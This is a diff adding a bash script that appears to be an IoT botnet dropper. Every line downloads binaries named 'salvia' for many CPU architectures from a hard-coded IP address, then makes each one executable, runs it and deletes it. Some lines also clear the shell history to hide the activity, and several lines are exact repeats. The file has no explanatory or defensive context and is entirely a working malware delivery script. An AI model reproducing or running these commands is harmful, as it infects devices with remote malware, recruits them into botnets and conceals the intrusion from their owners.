@@ -1,0 +1,30 @@
+#!/bin/bash
+cd /tmp; wget http://80.211.79.209/salviassh.mips -O smips; chmod 777 smips; ./smips; rm -rf smips; history -c
+cd /tmp; wget http://80.211.79.209/salvia.x86 -O rx86; chmod 777 rx86; ./rx86; rm -rf rx86; history -c
+cd /tmp; wget http://80.211.79.209/salvia.arm -O telarm; chmod 777 telarm; ./telarm; rm -rf telarm; history -c
+cd /tmp; wget http://80.211.79.209/salvia.arm5 -O t5arm5; chmod 777 t5arm5; ./t5arm5; rm -rf t5arm5; history -c
+cd /tmp; wget http://80.211.79.209/salvia.arm6 -O t6arm6; chmod 777 t6arm6; ./t6arm6; rm -rf t6arm6; history -c
+cd /tmp; wget http://80.211.79.209/salvia.arm7 -O t7arm7; chmod 777 t7arm7; ./t7arm7; rm -rf t7arm7; history -c
+cd /tmp; wget http://80.211.79.209/salvia.mpsl -O t1mpsl; chmod 777 t1mpsl; ./t1mpsl; rm -rf t1mpsl; history -c
+cd /tmp; wget http://80.211.79.209/salvia.ppc -O t1ppc; chmod 777 t1ppc; ./t1ppc; rm -rf t1ppc; history -c
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.79.209/salviassh.mips; chmod +x salviassh.mips; ./salviassh.mips; rm -rf salviassh.mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.79.209/salvia.mpsl; chmod +x salvia.mpsl; ./salvia.mpsl; rm -rf salvia.mpsl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.79.209/salviaroot.x86; chmod +x salviaroot.x86; ./salviaroot.x86; rm -rf salviaroot.x86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.79.209/salviatelnet.arm4; chmod +x salviatelnet.arm4; ./salviatelnet.arm4; rm -rf salviatelnet.arm4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.79.209/salvia.i686; chmod +x salvia.i686; ./salvia.i686; rm -rf salvia.i686
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.79.209/salvia.ppc; chmod +x salvia.ppc; ./salvia.ppc; rm -rf salvia.ppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.79.209/salvia.i586; chmod +x salvia.i586; ./salvia.i586; rm -rf salvia.i586
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.79.209/salviassh.mips; chmod +x salviassh.mips; ./salviassh.mips; rm -rf salviassh.mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.79.209/salvia.mpsl; chmod +x salvia.mpsl; ./salvia.mpsl; rm -rf salvia.mpsl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.79.209/salviaroot.x86; chmod +x salviaroot.x86; ./salviaroot.x86; rm -rf salviaroot.x86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.79.209/salviatelnet.arm4; chmod +x salviatelnet.arm4; ./salviatelnet.arm4; rm -rf salviatelnet.arm4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.79.209/salvia.i686; chmod +x salvia.i686; ./salvia.i686; rm -rf salvia.i686
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.79.209/salvia.ppc; chmod +x salvia.ppc; ./salvia.ppc; rm -rf salvia.ppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.79.209/salvia.i586; chmod +x salvia.i586; ./salvia.i586; rm -rf salvia.i586
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.79.209/salviassh.mips; chmod +x salviassh.mips; ./salviassh.mips; rm -rf salviassh.mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.79.209/salvia.mpsl; chmod +x salvia.mpsl; ./salvia.mpsl; rm -rf salvia.mpsl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.79.209/salviaroot.x86; chmod +x salviaroot.x86; ./salviaroot.x86; rm -rf salviaroot.x86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.79.209/salviatelnet.arm4; chmod +x salviatelnet.arm4; ./salviatelnet.arm4; rm -rf salviatelnet.arm4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.79.209/salvia.i686; chmod +x salvia.i686; ./salvia.i686; rm -rf salvia.i686
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.79.209/salvia.ppc; chmod +x salvia.ppc; ./salvia.ppc; rm -rf salvia.ppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.79.209/salvia.i586; chmod +x salvia.i586; ./salvia.i586; rm -rf salvia.i586
